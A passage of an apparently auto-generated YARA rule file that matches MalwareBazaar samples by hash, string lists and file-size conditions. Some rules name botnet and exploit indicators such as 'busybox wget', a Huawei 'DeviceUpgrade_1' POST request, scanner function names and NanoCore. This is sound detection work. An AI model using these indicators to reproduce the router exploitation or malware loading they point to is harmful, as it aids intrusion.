        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "/Gets or sets an annotation's content alignment."
        $s9 = "JGets or sets a flag, which indicates if an annotation anchor can be moved."
        $s10 = "CGets or sets a flag, which indicates if an annotation can be moved."
        $s11 = "fGets or sets a flag which defines if SmartLabels are allowed to be drawn outside of the plotting area."
        $s12 = "TGets or sets a flag, which indicates if the polygon annotation's path can be edited."
        $s13 = "EGets or sets a flag, which indicates if an annotation can be resized."
        $s14 = "FGets or sets a flag, which indicates if an annotation can be selected."
        $s15 = "KGets or sets a flag, which indicates if an annotation's text can be edited."
        $s16 = "@Gets or sets annotation object alignment relative to the anchor."
        $s17 = "9Gets or sets the data point an annotation is anchored to."
        $s18 = ";Gets or sets data point name the annotation is attached to."
        $s19 = "EGets or sets an annotation X position's offset from the anchor point."
        $s20 = "EGets or sets an annotation Y position's offset from the anchor point."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB and
        all of them
}

rule Windows_08e99c84eae02bcadf577873cf34b6f87b718d83b9c8721e849888425ed9450d
{
    meta:
        description = "Auto ML: 08e99c84eae02bcadf577873cf34b6f87b718d83b9c8721e849888425ed9450d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4605KB and
        all of them
}

rule Linux_66de0381a4186a04dd7c52d8110a4d41f695a1395c78006fe6ce9a6e72e2896e
{
    meta:
        description = "Auto ML: 66de0381a4186a04dd7c52d8110a4d41f695a1395c78006fe6ce9a6e72e2896e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "getpid"
        $s3 = "readlink"
        $s4 = "system"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "write"
        $s8 = "setsockopt"
        $s9 = "read"
        $s10 = "fopen"
        $s11 = "memset"
        $s12 = "fclose"
        $s13 = "getppid"
        $s14 = "opendir"
        $s15 = "getsockopt"
        $s16 = "getaddrinfo"
        $s17 = "setsid"
        $s18 = "closedir"
        $s19 = "getsockname"
        $s20 = "http://"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB and
        all of them
}

rule Windows_66e8cd483fecac0f1cb9ab74cad35ae7c4993b7621c5afedf55801796d1706fc
{
    meta:
        description = "Auto ML: 66e8cd483fecac0f1cb9ab74cad35ae7c4993b7621c5afedf55801796d1706fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Failed to open archive %s!"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7366KB and
        all of them
}

rule Windows_6716e245598aa6ca23203f7fdeb0f94fb411570d98bcd11b946839b67bdb5f37
{
    meta:
        description = "Auto ML: 6716e245598aa6ca23203f7fdeb0f94fb411570d98bcd11b946839b67bdb5f37"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "media_and_date_constructor_for_performers.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5209KB and
        all of them
}

rule Linux_6737d88486bee3a1f95cfddc00935749da9b37933d1ca13128ec068b3fab4ea4
{
    meta:
        description = "Auto ML: 6737d88486bee3a1f95cfddc00935749da9b37933d1ca13128ec068b3fab4ea4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB and
        all of them
}

rule Linux_67470400f8dc720fbfa14c260c011b6bf30ffb1ee80dcbfe71200c5de252a9c5
{
    meta:
        description = "Auto ML: 67470400f8dc720fbfa14c260c011b6bf30ffb1ee80dcbfe71200c5de252a9c5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB and
        all of them
}

rule Windows_675eae5e18d018109f42efb7c76c9ac83af9ffd9e010d39acbb6a12450d6d1eb
{
    meta:
        description = "Auto ML: 675eae5e18d018109f42efb7c76c9ac83af9ffd9e010d39acbb6a12450d6d1eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "AssemblyKeyFileAttribute"
        $s13 = "System.Resources"
        $s14 = "a_collection_of_necessary_programs_for_use.exe"
        $s15 = "<Module>"
        $s16 = "MySettings"
        $s17 = "ApplicationSettingsBase"
        $s18 = "System.Configuration"
        $s19 = "MySettingsProperty"
        $s20 = "System.Windows.Forms"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4638KB and
        all of them
}

rule Windows_67872249c80e5ecfa6ea2f7f87c1fd90021aef6f70f752f8ea9539b1c6f89f85
{
    meta:
        description = "Auto ML: 67872249c80e5ecfa6ea2f7f87c1fd90021aef6f70f752f8ea9539b1c6f89f85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "System"
        $s7 = "Create"
        $s8 = "IOffset"
        $s9 = "ImplGetter"
        $s10 = "GetInterface"
        $s11 = "GetInterfaceEntry"
        $s12 = "GetInterfaceTable"
        $s13 = "GetHashCode"
        $s14 = "NewInstance"
        $s15 = "TMonitor.PWaitingThread"
        $s16 = "TMonitor.TWaitingThread"
        $s17 = "Thread"
        $s18 = "FOwningThread"
        $s19 = "SetSpinCount"
        $s20 = "tkSet"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3137KB and
        all of them
}

rule Windows_67910cf27c732b63041567c28e40cfec63c7e7c3bf96fd0498194d016706afd7
{
    meta:
        description = "Auto ML: 67910cf27c732b63041567c28e40cfec63c7e7c3bf96fd0498194d016706afd7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "GetModuleHandleA"
        $s4 = "GetProcessHeap"
        $s5 = "HeapCreate"
        $s6 = "ntdll.dll"
        $s7 = "LoadLibraryExA"
        $s8 = "CreateFileW"
        $s9 = "GetFileSize"
        $s10 = "ReadFile"
        $s11 = "CloseHandle"
        $s12 = "GetTickCount"
        $s13 = "GetProcAddress"
        $s14 = "DbgUserBreakPoint"
        $s15 = "kernel32.dll"
        $s16 = "NtQueryInformationThread"
        $s17 = "NtSetInformationThread"
        $s18 = "user32.dll"
        $s19 = "advapi32.dll"
        $s20 = "iphlpapi.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1652KB and
        all of them
}

rule Windows_679a262683269630fd0a597ca8a8495766d6a2950c406e12c821c9b19c290d23
{
    meta:
        description = "Auto ML: 679a262683269630fd0a597ca8a8495766d6a2950c406e12c821c9b19c290d23"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s8 = "RegSetValueExA"
        $s9 = "RegCloseKey"
        $s10 = "RegDeleteValueA"
        $s11 = "RegDeleteKeyA"
        $s12 = "OpenProcessToken"
        $s13 = "RegOpenKeyExA"
        $s14 = "RegCreateKeyExA"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHFileOperationA"
        $s17 = "SHGetFileInfoA"
        $s18 = "SHGetPathFromIDListA"
        $s19 = "ShellExecuteExA"
        $s20 = "SHELL32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4438KB and
        all of them
}

rule Windows_67d39d9194a79f2f1aa0585b8cbc3a38a651964d72469e27692a62038ae3b412
{
    meta:
        description = "Auto ML: 67d39d9194a79f2f1aa0585b8cbc3a38a651964d72469e27692a62038ae3b412"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "BcMDY"
        $s6 = "hWIN"
        $s7 = "FlsSetValue"
        $s8 = "FlsGetValue"
        $s9 = "CorExitProcess"
        $s10 = "An application has made an attempt to load the C runtime library incorrectly."
        $s11 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s12 = "- Attempt to initialize the CRT more than once."
        $s13 = "- unable to open console device"
        $s14 = "- unexpected multithread lock error"
        $s15 = "- not enough space for thread data"
        $s16 = "- floating point support not loaded"
        $s17 = "SystemFunction036"
        $s18 = "ADVAPI32.DLL"
        $s19 = "`local static thread guard'"
        $s20 = "`placement delete[] closure'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1957KB and
        all of them
}

rule Linux_0967b7aca84aa469261ab69595f81a601eede01b1c565fd58ce8fc2a18128449
{
    meta:
        description = "Auto ML: 0967b7aca84aa469261ab69595f81a601eede01b1c565fd58ce8fc2a18128449"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 69KB and
        all of them
}

rule Windows_6800905847788c228e211fd1086dad6a20aa745d1351c0bd43d5f89aa58b1c9e
{
    meta:
        description = "Auto ML: 6800905847788c228e211fd1086dad6a20aa745d1351c0bd43d5f89aa58b1c9e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "NanoCore Client.exe"
        $s6 = "System.Windows.Forms"
        $s7 = "System"
        $s8 = "System.Drawing"
        $s9 = "kernel32.dll"
        $s10 = "psapi.dll"
        $s11 = "advapi32.dll"
        $s12 = "ntdll.dll"
        $s13 = "dnsapi.dll"
        $s14 = "ClientLoaderForm.resources"
        $s15 = "User"
        $s16 = "Microsoft.VisualBasic.CompilerServices"
        $s17 = "StandardModuleAttribute"
        $s18 = "HideModuleNameAttribute"
        $s19 = "Registry"
        $s20 = "Microsoft.Win32"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 534KB and
        all of them
}

rule Linux_68082254cd8b7e129b468d63f5663bf0f789009e796abce9ac41ccd881f9003c
{
    meta:
        description = "Auto ML: 68082254cd8b7e129b468d63f5663bf0f789009e796abce9ac41ccd881f9003c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 141KB and
        all of them
}

rule Windows_6809cbf33e60910d18f847f7413ab46487685aa945ee954c3fbb63e82e633a93
{
    meta:
        description = "Auto ML: 6809cbf33e60910d18f847f7413ab46487685aa945ee954c3fbb63e82e633a93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "kernel32.dll"
        $s7 = "user32.dll"
        $s8 = "User32.dll"
        $s9 = "gdiplus.dll"
        $s10 = "GdiPlus.dll"
        $s11 = "Kernel32.dll"
        $s12 = "msimg32.dll"
        $s13 = "user32"
        $s14 = "Gdiplus.dll"
        $s15 = "UxTheme.dll"
        $s16 = "GetModuleHandleA"
        $s17 = "CreateWindowExA"
        $s18 = "SetPropA"
        $s19 = "MoveWindow"
        $s20 = "GdipGetImagePixelFormat"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2516KB and
        all of them
}

rule Windows_683391c9e997f8e960c52edb11106157fb4bf122d21a0a72fe6a9a14ebacf584
{
    meta:
        description = "Auto ML: 683391c9e997f8e960c52edb11106157fb4bf122d21a0a72fe6a9a14ebacf584"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "32] The new tribunal, set up"
        $s6 = "GetCursor"
        $s7 = "SetUnhandledExceptionFilter"
        $s8 = "ShellExecuteA"
        $s9 = "FlushFileBuffers"
        $s10 = "GetOpenFileNameA"
        $s11 = "DeleteObject"
        $s12 = "timeSetEvent"
        $s13 = "GetUserDefaultLCID"
        $s14 = "LoadLibraryW"
        $s15 = "GetDlgItemTextA"
        $s16 = "GetSaveFileNameA"
        $s17 = "LoadIconA"
        $s18 = "COMDLG32.dll"
        $s19 = "GetOEMCP"
        $s20 = "GetLastError"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 421KB and
        all of them
}

rule Linux_6839f298def7b6c2053c9f9d5de35896d33b5d373b9839b0ae57c98420338a14
{
    meta:
        description = "Auto ML: 6839f298def7b6c2053c9f9d5de35896d33b5d373b9839b0ae57c98420338a14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = ".text"
        $s4 = ".data"
        $s5 = ".comment"
        $s6 = "huaweiscanner_get_random_ip"
        $s7 = "huaweiscanner_setup_connection"
        $s8 = "read_elf"
        $s9 = "charset.2174"
        $s10 = "get_random_ip"
        $s11 = "setup_connection"
        $s12 = "consume_user_prompt"
        $s13 = "close.c"
        $s14 = "getpid.c"
        $s15 = "getppid.c"
        $s16 = "open.c"
        $s17 = "read.c"
        $s18 = "write.c"
        $s19 = "closedir.c"
        $s20 = "opendir.c"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Windows_684bcee9dcb5326013108c4f4fb40dce8d98bc937a00b64e9d9f9754d0c78377
{
    meta:
        description = "Auto ML: 684bcee9dcb5326013108c4f4fb40dce8d98bc937a00b64e9d9f9754d0c78377"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Windows_689ef1d29c263f78c9626e00500983e2589d28068a72fadba9a4b04b7eafbcaf
{
    meta:
        description = "Auto ML: 689ef1d29c263f78c9626e00500983e2589d28068a72fadba9a4b04b7eafbcaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "etatSygetartSreganaM.setatS.mrnxkuM#"
        $s6 = "etatSygetartSrehctapsiD.setatS.mrnxkuM&"
        $s7 = "kcoMmaraPtseT.skcoM.mrnxkuM"
        $s8 = "yxorPtseT"
        $s9 = "resopmoCtseT"
        $s10 = "eulaVtseT"
        $s11 = "maraPtseT"
        $s12 = "ygetartStacnoC"
        $s13 = "ygetartSetaluclaC"
        $s14 = "sutatSetadilaV"
        $s15 = "rotisiVygetartS_"
        $s16 = "gifnoCtseT"
        $s17 = "egaPtseT"
        $s18 = "rezilaitinItseT"
        $s19 = "resraPtseT"
        $s20 = "reifitnedIstseT_"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 857KB and
        all of them
}

rule Windows_68aabd5eb17a4e1025b7e62cbcbc7714ab8f6d371842c7f1561fd62a86e82676
{
    meta:
        description = "Auto ML: 68aabd5eb17a4e1025b7e62cbcbc7714ab8f6d371842c7f1561fd62a86e82676"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "s:IDS_BROWSETITLE"
        $s9 = "s:IDS_CMDEXTRACTING"
        $s10 = "s:IDS_FILEHEADERBROKEN"
        $s11 = "s:IDS_CANNOTOPEN"
        $s12 = "s:IDS_CANNOTCREATE"
        $s13 = "s:IDS_WRITEERROR"
        $s14 = "s:IDS_READERROR"
        $s15 = "s:IDS_CLOSEERROR"
        $s16 = "s:IDS_CREATEERRORS"
        $s17 = "s:IDS_ALLFILES"
        $s18 = "s:IDS_EXTRFILESTO"
        $s19 = "s:IDS_EXTRFILESTOTEMP"
        $s20 = "s:IDS_WRONGFILEPASSWORD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 978KB and
        all of them
}

rule Linux_690843128f27403b327803722537c80b6f58990d8ac7a420fd4dae51561d9953
{
    meta:
        description = "Auto ML: 690843128f27403b327803722537c80b6f58990d8ac7a420fd4dae51561d9953"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB and
        all of them
}

rule Windows_690c0f2a15eb6e975fce4a36d62cf29158825bb4f6e4e8313855e8181f45e2d3
{
    meta:
        description = "Auto ML: 690c0f2a15eb6e975fce4a36d62cf29158825bb4f6e4e8313855e8181f45e2d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1224KB and
        all of them
}

rule Linux_097d92f9c38dc1fae556478a8a1a921c80a75c88f26e94a943331f794751be13
{
    meta:
        description = "Auto ML: 097d92f9c38dc1fae556478a8a1a921c80a75c88f26e94a943331f794751be13"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 36KB and
        all of them
}

rule Windows_6915569f0193d21234ac6895ea64e29773d50d6d8589f02e778cccabfe5f5e90
{
    meta:
        description = "Auto ML: 6915569f0193d21234ac6895ea64e29773d50d6d8589f02e778cccabfe5f5e90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Nota1"
        $s5 = "set_Nota1"
        $s6 = "get_Nota2"
        $s7 = "set_Nota2"
        $s8 = "<Module>"
        $s9 = "CSUST.Data"
        $s10 = "get_KeyData"
        $s11 = "System.Collections.Generic"
        $s12 = "get_CurrentThread"
        $s13 = "Form1_Load"
        $s14 = "add_Load"
        $s15 = "get_EditingControlValueChanged"
        $s16 = "set_EditingControlValueChanged"
        $s17 = "set_Handled"
        $s18 = "get_IsDisposed"
        $s19 = "get_Focused"
        $s20 = "set_Selected"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 693KB and
        all of them
}

rule Linux_6926581df13527c07c4b0677102523929fc2873ecddd99034fd72f9159f22533
{
    meta:
        description = "Auto ML: 6926581df13527c07c4b0677102523929fc2873ecddd99034fd72f9159f22533"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Linux_69cfc80ea4c35a6d9ee9518a1424c13ca252a3f1b1ee1f652d766bc9bcaa307f
{
    meta:
        description = "Auto ML: 69cfc80ea4c35a6d9ee9518a1424c13ca252a3f1b1ee1f652d766bc9bcaa307f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_69dcabf46703032a4de46d1bb3f9e66dab4492f5bbbfb02ce5ddc751239f75bf
{
    meta:
        description = "Auto ML: 69dcabf46703032a4de46d1bb3f9e66dab4492f5bbbfb02ce5ddc751239f75bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.reloc"
        $s6 = "B.rsrc"
        $s7 = "System"
        $s8 = "Create"
        $s9 = "IOffset"
        $s10 = "ImplGetter"
        $s11 = "GetInterface"
        $s12 = "GetInterfaceEntry"
        $s13 = "GetInterfaceTable"
        $s14 = "GetHashCode"
        $s15 = "NewInstance"
        $s16 = "TMonitor.PWaitingThread"
        $s17 = "TMonitor.TWaitingThread"
        $s18 = "Thread"
        $s19 = "FOwningThread"
        $s20 = "SetSpinCount"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3200KB and
        all of them
}

rule Linux_6a09c3ab5061b5f9ec90614822dd1d4511029ecfb77643e69ef38352894804dd
{
    meta:
        description = "Auto ML: 6a09c3ab5061b5f9ec90614822dd1d4511029ecfb77643e69ef38352894804dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%s/cmdline"
        $s9 = "/bin/systemd"
        $s10 = "/var/Challenget"
        $s11 = "[killer] Failed to create child process."
        $s12 = "deleted"
        $s13 = "payloadasdf"
        $s14 = "GET /%s HTTP/1.0"
        $s15 = "User-Agent: Update v1.0"
